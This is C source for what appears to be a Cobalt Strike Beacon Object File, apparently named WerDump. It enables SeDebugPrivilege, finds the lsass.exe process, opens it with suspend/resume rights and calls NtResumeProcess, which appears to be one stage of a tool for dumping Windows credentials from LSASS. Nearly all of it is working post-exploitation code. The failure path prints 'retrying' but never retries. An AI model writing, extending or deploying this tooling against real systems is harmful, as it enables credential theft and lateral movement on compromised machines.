#include <windows.h>
#include "WerDump.h"

BOOL EnableDebugPrivilege() {
  HANDLE hToken = NULL;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL bReturnValue = FALSE;

  if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to open process token!\n");
    goto end;
  }
  if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to get privilege value!\n");
    goto end;
  }
  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Failed to get adjust privilege!\n");
    goto end;
  }
  if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
    BeaconPrintf(CALLBACK_ERROR, "[+] Some error, Check me out!\n");
    goto end;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[+] Enabled SeDebugPrivilege\n");
  bReturnValue = TRUE;

end:
  if (hToken) {
    KERNEL32$CloseHandle(hToken);
  }
  return bReturnValue;
}

// Get Lsass Process
BOOL EnumProcess(char *pProcessName, DWORD *pdwProcessId) {
  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

  if (!KERNEL32$Process32First(hSnapshot, &pe32)) {
    KERNEL32$CloseHandle(hSnapshot);
    return FALSE;
  }

  do {
    if (stricmp(pe32.szExeFile, pProcessName) == 0) {
      *pdwProcessId = pe32.th32ProcessID;
      KERNEL32$CloseHandle(hSnapshot);
      BeaconPrintf(CALLBACK_OUTPUT, "[+] Found lsass process PID: %u\n", *pdwProcessId);
      return TRUE;
    }
  } while (KERNEL32$Process32Next(hSnapshot, &pe32));

  return FALSE;
}

#ifdef BOF

void go(IN PCHAR args, IN ULONG argc) {
  /* DWORD dwProcessTid = GetMainThreadId(KERNEL32$GetProcessId(KERNEL32$GetCurrentProcess())); */
  // Check first if we can enable the privilege.
  if (!EnableDebugPrivilege()) {
      BeaconPrintf(CALLBACK_ERROR, "[+] Failed to enable SeDebugPrivilege\n");
      return;
  }
  DWORD dwProcessId;
  if (!EnumProcess("lsass.exe", &dwProcessId)) return;

  BeaconPrintf(CALLBACK_ERROR, "[+] Sleeping for 5 seconds then opening handle\n");
  KERNEL32$Sleep(5000);
  BeaconPrintf(CALLBACK_ERROR, "[+] Opening ....\n");
  HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, dwProcessId);
  if (!hProcess) {
    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open process with PROCESS_SUSPEND_RESUME, retrying...\n");
  }
  BeaconPrintf(CALLBACK_ERROR, "[+] Opened a handle to lsass.exe\n");
  NTSTATUS STATUS = NTDLL$NtResumeProcess(hProcess);
  if (STATUS == 0x00) {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully resumed process with PID: %d\n", dwProcessId);
    KERNEL32$CloseHandle(hProcess);
    return; // Success, exit the thread
  }

  BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resume process\n");
  KERNEL32$CloseHandle(hProcess);
}

#else

int main() {
  return 0;
}

#endif
